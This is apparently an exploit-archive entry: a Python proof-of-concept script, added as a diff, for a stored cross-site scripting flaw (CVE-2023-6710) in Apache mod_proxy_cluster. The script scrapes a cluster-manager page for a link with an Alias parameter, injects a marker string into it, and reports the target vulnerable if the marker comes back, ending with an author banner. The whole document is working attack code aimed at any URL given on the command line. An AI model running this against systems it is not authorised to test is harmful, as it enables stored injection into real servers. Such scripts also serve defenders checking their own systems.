@@ -1,0 +1,117 @@
+id: 39603
+date: 05/13/2024
+title: Apache mod_proxy_cluster - Stored XSS Exploit
+author: Mohamed Mounir Boudjema
+cves: 
+
+import requests
+import argparse
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from requests.exceptions import RequestException
+
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[1;49;92m'
+    RESET = '\033[0m'
+
+def get_cluster_manager_url(base_url, path):
+    print(Colors.GREEN + f"Preparing the groundwork for the exploitation on {base_url}..." + Colors.RESET)
+    try:
+        response = requests.get(base_url + path)
+        response.raise_for_status()
+    except requests.exceptions.RequestException as e:
+        print(Colors.RED + f"Error: {e}" + Colors.RESET)
+        return None
+
+    print(Colors.GREEN + f"Starting exploit check on {base_url}..." + Colors.RESET)
+
+    if response.status_code == 200:
+        print(Colors.GREEN + f"Check executed successfully on {base_url}..." + Colors.RESET)
+        # Use BeautifulSoup to parse the HTML content
+        soup = BeautifulSoup(response.text, 'html.parser')
+
+        # Find all 'a' tags with 'href' attribute
+        all_links = soup.find_all('a', href=True)
+
+        # Search for the link containing the Alias parameter in the href attribute
+        cluster_manager_url = None
+        for link in all_links:
+            parsed_url = urlparse(link['href'])
+            query_params = parse_qs(parsed_url.query)
+            alias_value = query_params.get('Alias', [None])[0]
+
+            if alias_value:
+                print(Colors.GREEN + f"Alias value found" + Colors.RESET)
+                cluster_manager_url = link['href']
+                break
+
+        if cluster_manager_url:
+            print(Colors.GREEN + f"Preparing the injection on {base_url}..." + Colors.RESET)
+            return cluster_manager_url
+        else:
+            print(Colors.RED + f"Error: Alias value not found on {base_url}..." + Colors.RESET)
+            return None
+
+    print(Colors.RED + f"Error: Unable to get the initial step on {base_url}")
+    return None
+
+def update_alias_value(url):
+    parsed_url = urlparse(url)
+    query_params = parse_qs(parsed_url.query, keep_blank_values=True)
+    query_params['Alias'] = ["<DedSec-47>"]
+    updated_url = urlunparse(parsed_url._replace(query=urlencode(query_params, doseq=True)))
+    print(Colors.GREEN + f"Injection executed successfully on {updated_url}" + Colors.RESET)
+    return updated_url
+
+def check_response_for_value(url, check_value):
+    response = requests.get(url)
+    if check_value in response.text:
+        print(Colors.RED + "Website is vulnerable POC by :")
+        print(Colors.GREEN + """
+          ____           _ ____                  _  _ _____ 
+         |  _ \  ___  __| / ___|  ___  ___      | || |___  |
+         | | | |/ _ \/ _` \___ \ / _ \/ __| ____| || |  / / 
+         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /  
+         |____/ \___|\__,_|____/ \___|\___|        |_|/_/   
+                                     github.com/DedSec-47    """)
+    else:
+        print(Colors.GREEN + "Website is not vulnerable POC by :")
+        print(Colors.GREEN + """
+          ____           _ ____                  _  _ _____ 
+         |  _ \  ___  __| / ___|  ___  ___      | || |___  |
+         | | | |/ _ \/ _` \___ \ / _ \/ __| ____| || |  / / 
+         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /  
+         |____/ \___|\__,_|____/ \___|\___|        |_|/_/   
+                                     github.com/DedSec-47    """)
+
+def main():
+    # Create a command-line argument parser
+    parser = argparse.ArgumentParser(description="python CVE-2023-6710.py -t https://example.com -u /cluster-manager")
+
+    # Add a command-line argument for the target (-t/--target)
+    parser.add_argument('-t', '--target', help='Target domain (e.g., https://example.com)', required=True)
+
+    # Add a command-line argument for the URL path (-u/--url)
+    parser.add_argument('-u', '--url', help='URL path (e.g., /cluster-manager)', required=True)
+
+    # Parse the command-line arguments
+    args = parser.parse_args()
+
+    # Get the cluster manager URL from the specified website
+    cluster_manager_url = get_cluster_manager_url(args.target, args.url)
+
+    # Check if the cluster manager URL is found
+    if cluster_manager_url:
+        # Modify the URL by adding the cluster manager value
+        modified_url = args.target + cluster_manager_url
+        modified_url = update_alias_value(args.target + cluster_manager_url)
+        print(Colors.GREEN + "Check executed successfully" + Colors.RESET)
+
+        # Check the response for the value "<DedSec-47>"
+        check_response_for_value(modified_url, "<DedSec-47>")
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2024-05-17]  #
